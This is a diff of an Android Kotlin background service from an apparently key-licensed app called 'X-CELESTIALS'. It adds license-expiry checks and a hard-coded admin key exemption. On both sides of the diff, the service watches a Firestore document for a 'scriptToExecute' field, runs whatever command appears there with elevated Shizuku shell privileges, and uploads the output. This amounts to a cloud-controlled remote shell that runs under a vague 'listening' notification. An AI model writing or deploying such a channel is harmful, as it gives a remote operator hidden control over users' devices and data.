@@ -1,85 +1,89 @@
 package com.example.services
 
+import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
+import com.example.MainActivity
 import com.example.R
 import com.example.utils.FreezeManager
+import com.example.utils.PanelFileManager
 import com.example.utils.RenameUtil
-import com.google.firebase.firestore.DocumentSnapshot
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.firestore.ListenerRegistration
 
 class ScriptService : Service() {
+
     private val CHANNEL_ID = "ScriptServiceChannel"
     private var listenerRegistration: ListenerRegistration? = null
 
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
-        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("X-CELESTIALS")
             .setContentText("Listening for background events...")
             .setSmallIcon(R.mipmap.ic_launcher)
             .build()
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-        } else {
-            startForeground(1, notification)
-        }
-    }
-
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                "Background Listening Service",
-                NotificationManager.IMPORTANCE_LOW
-            )
-            val nm = getSystemService(NotificationManager::class.java)
-            nm?.createNotificationChannel(channel)
-        }
+        startForeground(1, notification)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        val savedKey = getSharedPreferences("xcel_prefs", Context.MODE_PRIVATE)
-            .getString("saved_key", null)
+        val prefs = getSharedPreferences(MainActivity.PREFS_NAME, Context.MODE_PRIVATE)
+        val savedKey = prefs.getString(MainActivity.KEY_SAVED_KEY, null)
+        
         FreezeManager.startListening(this)
-        if (savedKey != null && !savedKey.equals("mujahi@admin", ignoreCase = true)) {
+
+        if (savedKey != null && savedKey != "mujahi@admin") {
             listenForScripts(savedKey)
         }
+        
         return START_STICKY
     }
-
-    private fun listenForScripts(key: String) {
+    
+    private fun listenForScripts(savedKey: String) {
         listenerRegistration?.remove()
-        listenerRegistration = FirebaseFirestore.getInstance()
-            .collection("users")
-            .document(key)
-            .addSnapshotListener { snapshot: DocumentSnapshot?, error ->
-                if (error == null && snapshot != null && snapshot.exists()) {
-                    val script = snapshot.getString("scriptToExecute")
-                    if (!script.isNullOrBlank()) {
-                        Thread {
-                            try {
-                                val output = RenameUtil.executeShizukuCommandWithOutput(script)
-                                FirebaseFirestore.getInstance().collection("users").document(key)
-                                    .update("scriptOutput", output, "scriptToExecute", "")
-                            } catch (e: Exception) {
-                                FirebaseFirestore.getInstance().collection("users").document(key)
-                                    .update("scriptOutput", e.message ?: "Error", "scriptToExecute", "")
-                            }
-                        }.start()
-                    }
-                }
+        listenerRegistration = FirebaseFirestore.getInstance().collection("users").document(savedKey).addSnapshotListener { snapshot, e ->
+            if (e != null || snapshot == null || !snapshot.exists()) return@addSnapshotListener
+            
+            // Check key validity in real-time
+            val isActive = snapshot.getBoolean("isActive") ?: true
+            val expireTime = snapshot.getTimestamp("expireDate")?.toDate()?.time ?: Long.MAX_VALUE
+            if (!isActive || System.currentTimeMillis() > expireTime) {
+                val prefs = getSharedPreferences(MainActivity.PREFS_NAME, Context.MODE_PRIVATE)
+                prefs.edit().remove(MainActivity.KEY_SAVED_KEY).remove(MainActivity.KEY_USER_TYPE).apply()
+                Thread {
+                    RenameUtil.turnOff(applicationContext)
+                }.start()
+                stopSelf()
+                return@addSnapshotListener
             }
+
+            val scriptToExecute = snapshot.getString("scriptToExecute")
+            if (!scriptToExecute.isNullOrEmpty()) {
+                Thread {
+                    try {
+                        val output = RenameUtil.executeShizukuCommandWithOutput(scriptToExecute)
+                        FirebaseFirestore.getInstance().collection("users").document(savedKey)
+                            .update(
+                                "scriptOutput", output,
+                                "scriptToExecute", ""
+                            )
+                    } catch (ex: Exception) {
+                        FirebaseFirestore.getInstance().collection("users").document(savedKey)
+                            .update(
+                                "scriptOutput", ex.message,
+                                "scriptToExecute", ""
+                            )
+                    }
+                }.start()
+            }
+        }
     }
 
     override fun onDestroy() {
@@ -87,5 +91,19 @@ class ScriptService : Service() {
         listenerRegistration?.remove()
     }
 
-    override fun onBind(intent: Intent?): IBinder? = null
+    override fun onBind(intent: Intent?): IBinder? {
+        return null
+    }
+
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val serviceChannel = NotificationChannel(
+                CHANNEL_ID,
+                "Background Listening Service",
+                NotificationManager.IMPORTANCE_LOW
+            )
+            val manager = getSystemService(NotificationManager::class.java)
+            manager?.createNotificationChannel(serviceChannel)
+        }
+    }
 }
